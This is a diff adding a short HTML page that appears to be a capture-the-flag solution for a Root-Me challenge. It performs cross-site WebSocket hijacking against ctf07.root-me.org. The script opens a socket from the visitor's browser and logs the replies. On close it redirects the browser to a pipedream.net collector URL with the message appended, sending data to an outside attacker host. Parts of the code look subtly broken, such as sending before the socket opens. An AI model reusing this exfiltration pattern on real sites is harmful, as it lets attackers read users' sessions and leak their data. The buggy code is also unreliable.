@@ -1,0 +1,24 @@
+<html>
+<meta charset="utf-8">  
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+<script>
+
+    window.WebSocket = window.WebSocket || window.MozWebSocket;
+    var connection = new WebSocket('ws://ctf07.root-me.org/ws');  
+    connection.onopen = function () {};  
+    connection.onerror = function (error) {
+      alert("An error occured, you will reload the page for you to access a new room !")
+      location.reload()
+    };
+    connection.onmessage = function (message) {
+	console.log(message)
+    };
+    connection.onclose = function(message) {
+      console.log(message)
+      window.location.replace("https://enhp4tuv2oqjs.x.pipedream.net/"+message);
+    }
+connection.send("hello")
+
+</script>
+</html>
